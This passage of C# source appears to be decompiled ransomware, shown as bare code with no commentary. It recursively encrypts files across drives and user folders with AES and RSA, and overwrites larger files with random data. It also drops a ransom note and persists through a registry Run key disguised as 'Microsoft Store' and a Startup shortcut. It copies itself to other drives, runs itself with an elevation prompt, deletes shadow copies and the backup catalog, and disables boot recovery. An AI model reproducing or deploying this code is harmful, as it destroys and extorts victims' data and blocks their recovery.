	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string randomEncode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152)
					{
						if (encryptionAesRsa)
						{
							EncryptFile(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000)
					{
						Random random = new Random();
						int length = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(random_bytes(length));
						File.WriteAllText(files[i], randomEncode(@string));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], randomEncode(string2));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFile(string file)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		string text = CreatePassword(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(file, file + "." + RandomStringForExtension(4));
	}

	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
		string location = userDir + userName + "\\Desktop";
		string location2 = userDir + userName + "\\Links";
		string location3 = userDir + userName + "\\Contacts";
		string location4 = userDir + userName + "\\Desktop";
		string location5 = userDir + userName + "\\Documents";
		string location6 = userDir + userName + "\\Downloads";
		string location7 = userDir + userName + "\\Pictures";
		string location8 = userDir + userName + "\\Music";
		string location9 = userDir + userName + "\\OneDrive";
		string location10 = userDir + userName + "\\Saved Games";
		string location11 = userDir + userName + "\\Favorites";
		string location12 = userDir + userName + "\\Searches";
		string location13 = userDir + userName + "\\Videos";
		encryptDirectory(location);
		encryptDirectory(location2);
		encryptDirectory(location3);
		encryptDirectory(location4);
		encryptDirectory(location5);
		encryptDirectory(location6);
		encryptDirectory(location7);
		encryptDirectory(location8);
		encryptDirectory(location9);
		encryptDirectory(location10);
		encryptDirectory(location11);
		encryptDirectory(location12);
		encryptDirectory(location13);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
